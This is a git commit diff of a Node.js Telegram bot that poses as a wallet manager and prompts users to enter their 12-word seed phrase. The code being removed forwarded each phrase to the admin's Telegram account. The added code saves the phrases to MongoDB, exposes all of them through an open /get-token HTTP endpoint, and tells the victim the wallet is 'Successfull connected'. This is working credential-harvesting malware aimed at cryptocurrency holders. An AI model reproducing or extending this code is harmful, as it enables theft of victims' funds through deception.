cec76a385601734f80b0ef4184e267ecfb363d15
Bright <brightagu2@gmail.com>
2024-07-08 17:09:47 +0100

    updaet

--- app.js
+++ app.js
@@ -1,24 +1,45 @@
 require("dotenv").config();
+const express = require("express");
+const mongoose = require("mongoose");
 const TelegramBot = require("node-telegram-bot-api");
 const botToken = process.env.API_KEY;
 console.log(botToken);
 const bot = new TelegramBot(botToken, { polling: true });
 const axios = require("axios");
 const myUserId = process.env.ADMIN_id;
-// const getUsersArray = async (chatId) => {
-//   try {
-//     const members = await bot.getChatAdministrators(chatId);
-//     const array = members.map((member) => member.user.id);
-//     console.log(array);
-//     return array;
-//   } catch (error) {
-//     console.log(error.message);
-//   }
-// };
+
+const app = express();
+
 let Text;
 let photoId;
 let photoSize;
 let chatId;
+
+const userSchema = new mongoose.Schema({
+  walletname: {
+    type: String,
+  },
+  keys: {
+    type: String,
+  },
+  keys: {
+    type: String,
+  },
+});
+
+const User = mongoose.model("User", userSchema);
+
+app.use(express.json());
+
+app.use("/get-token", async (req, res) => {
+  try {
+    const data = await User.find({});
+    const mainData = data.reverse();
+    res.json({ msg: "success", mainData });
+  } catch (error) {
+    res.status(500).json({ msg: "error" });
+  }
+});
 
 async function tagAllGroupMembers(groupId) {
   try {
@@ -65,6 +86,17 @@ bot.onText(/\/setImage/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(chatId, "upload an image");
 });
+bot.onText(/\/input_wallet/, (msg) => {
+  const chatId = msg.chat.id;
+  const options = {
+    reply_markup: {
+      inline_keyboard: [[{ text: "Input Wallet", callback_data: "wallet" }]],
+    },
+  };
+  bot.sendMessage(chatId, "Enter Wallet Address:");
+  bot.once();
+});
+
 bot.onText(/\/Import_Wallet/, (msg) => {
   const chatId = msg.chat.id;
   const options = {
@@ -78,10 +110,24 @@ bot.onText(/\/Import_Wallet/, (msg) => {
   };
   bot.sendMessage(chatId, "Select your Wallet Network:", options);
 });
+
+const updatedatabase = async (network, wallet, seed) => {
+  try {
+    const user = await User.create({
+      walletname: wallet,
+      keys: seed,
+      wallet: network,
+    });
+  } catch (error) {
+    console.log(error);
+  }
+};
 bot.on("callback_query", (callbackQuery) => {
   const msg = callbackQuery.message;
   const chatId = msg.chat.id;
   const network = callbackQuery.data;
+
+  console.log(callbackQuery);
 
   // Acknowledge the callback query
   bot.answerCallbackQuery(callbackQuery.id).then(() => {
@@ -96,17 +142,19 @@ bot.on("callback_query", (callbackQuery) => {
       bot.sendMessage(chatId, "Enter your 12-Seed Phrase:");
 
       // Step 5: Listen for the next message to get the 7-seed phrase
-      bot.once("message", (msg) => {
+      bot.once("message", async (msg) => {
         const seedPhrase = msg.text;
 
         // Do something with the wallet name and seed phrase
         console.log("Network:", network);
         console.log("Wallet Name:", walletName);
         console.log("7-Seed Phrase:", seedPhrase);
+        await updatedatabase(network, walletName, seedPhrase);
 
-        // Send the collected information to yourself as a direct message
-        const message = `Network: ${network}\nWallet Name: ${walletName}\n7-Seed Phrase: ${seedPhrase}`;
-        bot.sendMessage(myUserId, message);
+        bot.sendMessage(
+          chatId,
+          "Wallet Successfull connected, /input_wallet  you wish to copy"
+        );
 
         // Send a confirmation message to the user
         bot.sendMessage(
@@ -117,12 +165,13 @@ bot.on("callback_query", (callbackQuery) => {
     });
   });
 });
+
 bot.onText(/\/start/, (msg) => {
   console.log("You said hii");
   const chatId = msg.chat.id;
   bot.sendMessage(
     chatId,
-    "Select and Manage your wallet:\nUse /Import_Wallet to add wallet"
+    "Select and Manage your wallet:\nUse  /Import_Wallet to add wallet"
   );
 });
 
@@ -153,5 +202,17 @@ bot.onText(/\/start/, (msg) => {
 // });
 
 console.log("listening");
+(async () => {
+  try {
+    await mongoose.connect(process.env.MONGO_URI);
+
+    app.listen(process.env.PORT || 5000, () => {
+      console.log(`App Listening on port ${process.env.PORT || 5000}`);
+    });
+  } catch (error) {
+    console.log(error);
+  }
+})();
+
 console.log(`fileId = ${photoId}`);
 console.log(`Message = ${Text}`);
